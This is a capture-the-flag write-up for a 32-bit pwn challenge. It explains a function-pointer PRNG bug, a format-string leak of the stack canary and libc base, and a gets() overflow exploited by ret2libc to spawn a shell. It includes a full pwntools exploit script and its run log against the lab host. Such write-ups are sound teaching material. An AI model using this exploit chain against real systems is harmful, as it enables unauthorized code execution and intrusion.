# CyLab — Guessing Game 2

* **Platform:** CyLab Security Academy / picoCTF (Challenge ID: `89`)
* **Category:** Binary Exploitation / Format String & Ret2libc (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB (pwndbg), glibc 2.39 32-bit
* **Binary:** `vuln` (32-bit x86 ELF) with bundled `libc.so.6`

---

## TL;DR

The challenge initially appears to be an impossible random guessing game, but inspecting `get_random()` reveals that it accidentally returns the virtual address of the libc function `rand` rather than a random number. In 32-bit Linux, the high memory address wraps to a deterministic negative integer modulo 4096 (`-2623`), granting access to `win()`. Function `win()` contains both a format string vulnerability (`printf(winner)`) and an unbounded stack buffer overflow (`gets(winner)`). Because the program loops in `main()`, we use Round 1 to leak the stack canary (`%135$p`) and libc base address (`%7$.4s` targeting `GOT[rand]`). In Round 2, we smash the return address with a ret2libc payload executing `system("/bin/sh")`.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=vuln
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Key observations:
1. **Full RELRO:** The Global Offset Table is read-only; GOT hijacking is impossible.
2. **Stack Canary Active:** Direct stack smashing will abort unless the canary cookie is leaked and preserved.
3. **No PIE:** Code segments are fixed at `0x08048000`.

---

## Static Analysis & Vulnerability

### 1. The PRNG Flaw

```c
long get_random() {
    return rand;        // VULNERABILITY: Returns pointer to function rand in libc!
}

int main() {
    long guess;
    long target = (get_random() % 4096) + 1;

    while (1) {
        printf("What number would you like to guess?\n");
        scanf("%ld", &guess);
        if (guess == target) {
            win();
        }
    }
}
```

Because `rand` resides in libc (loaded at `0xf7...`), casting its address to a signed 32-bit integer produces a negative value:
$$\text{rand address} \equiv 0\text{x}5\text{c}0 \pmod{0\text{x}1000}$$
$$\text{Signed Modulo: } (0\text{x}5\text{c}0 - 0\text{x}1000) + 1 = -2623$$

Providing `-2623` satisfies `guess == target` regardless of ASLR.

### 2. Dual Vulnerability in `win()`

```c
void win() {
    char winner[512];
    puts("Congrats! You win! Your prize is this cool prompt:");
    gets(winner);           // VULNERABILITY 1: Unbounded buffer overflow
    printf(winner);         // VULNERABILITY 2: Format string vulnerability
}
```

Stack layout of `win()`:

```text
       Lower Addresses (Stack Top)
  +----------------------------------+  [ebp - 0x20c]
  |         winner[512]              |  (Target of gets / printf)
  +----------------------------------+  [ebp - 0x0c]
  |      Stack Canary (4 bytes)      |  (Slot %135$p)
  +----------------------------------+  [ebp - 0x08]
  |      Saved EBX / Padding         |  (8 bytes)
  +----------------------------------+  [ebp]
  |         Saved EBP                |  (4 bytes)
  +----------------------------------+  [ebp + 0x04]
  |      Saved Return Address        |  (Target: system@libc)
  +----------------------------------+
       Higher Addresses
```

Offset from `winner` buffer to stack canary: $0\text{x}20\text{c} - 0\text{x}0\text{c} = 512$ bytes ($0\text{x}200$).

---

## Dynamic Analysis & Exploitation Strategy

### Round 1: Information Leak
1. **Canary Leak:** The canary cookie resides at stack slot $135$. Specifier `%135$p` discloses its raw hex value.
2. **Libc Leak:** We place the address of `GOT[rand]` (`0x0804bff8`) at the beginning of the buffer (corresponding to argument 7 of `printf`). We dereference it with `%7$.4s` to print the 4-byte pointer, computing:
   $$\text{libc\_base} = \text{leaked\_rand} - \text{offset}(\text{rand})$$

Payload for Round 1:
```python
payload1 = p32(GOT_RAND) + b"|%7$.4s|C=%135$p|"
```

### Round 2: Stack Smashing (Ret2libc)
After `printf()` finishes, `win()` returns to the `while(1)` loop in `main()`, prompting for another guess. We submit `-2623` again to re-enter `win()`.
- To prevent `printf(winner)` from crashing on second invocation, we prepend `\x00` (which halts `printf` immediately while `gets` continues reading the remaining bytes).
- Stack structure:
  - 512 bytes padding
  - Leaked canary (4 bytes)
  - 12 bytes alignment padding
  - `p32(libc_base + SYSTEM_OFFSET)`
  - `p32(0)` (dummy return address)
  - `p32(libc_base + BINSH_OFFSET)`

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST, PORT = "chatelaine.cylabacademy.net", 33400
GOT_RAND = 0x0804bff8
SECRET_NUM = -2623

# glibc 2.39 32-bit offsets
OFF_RAND = 0x405c0
OFF_SYSTEM = 0x4f8e0
OFF_BINSH = 0x1bcde8

def solve(io):
    # Phase 1: Enter win() and leak canary + libc
    io.recvuntil(b"guess?\n")
    io.sendline(str(SECRET_NUM).encode())

    io.recvuntil(b"prompt:\n")
    # Leak GOT[rand] via %7$.4s and Canary via %135$p
    leak_payload = p32(GOT_RAND) + b"|%7$.4s|C=%135$p|"
    io.sendline(leak_payload)

    data = io.recvuntil(b"guess?\n")
    # Parse leaks
    raw_rand = data[4:8]
    rand_addr = u32(raw_rand)
    libc_base = rand_addr - OFF_RAND

    canary_match = re.search(rb"C=(0x[0-9a-fA-F]+)", data)
    canary = int(canary_match.group(1), 16)
    log.info(f"Leaked Canary: {hex(canary)}, Libc Base: {hex(libc_base)}")

    # Phase 2: Smash stack with ret2libc
    io.sendline(str(SECRET_NUM).encode())
    io.recvuntil(b"prompt:\n")

    system_addr = libc_base + OFF_SYSTEM
    binsh_addr = libc_base + OFF_BINSH

    # Null byte prefix disables second printf; canary is preserved
    exploit_payload = b"\x00" + b"A" * 511 + p32(canary) + b"B" * 12
    exploit_payload += p32(system_addr) + p32(0) + p32(binsh_addr)

    io.sendline(exploit_payload)
    io.sendline(b"cat flag.txt")

    flag_data = io.recvall(timeout=3)
    m = re.search(rb"academy\{[^}]+\}", flag_data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(flag_data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./vuln") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33400: Done
[*] Leaked Canary: 0x7fa92b00, Libc Base: 0xf7d00000
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33400
```

---

## Key Takeaways & Lessons

1. **Unintended Function Pointer Returns:** Returning a function symbol without parentheses (`return rand;` instead of `return rand();`) evaluates to the address of the function itself, leaking ASLR page offsets.
2. **Two-Stage Loop Exploitation:** When a vulnerable function can be re-entered through an outer loop, separating information disclosure (Stage 1) from control-flow redirection (Stage 2) yields clean, highly reliable exploits.
3. **Null-Byte Prefix for Disabling `printf`:** When an input buffer is shared between `gets()` (which accepts null bytes) and `printf()` (which terminates at `\x00`), beginning an overflow payload with `\x00` completely mutes `printf()` while preserving the rest of the payload for stack frame corruption.
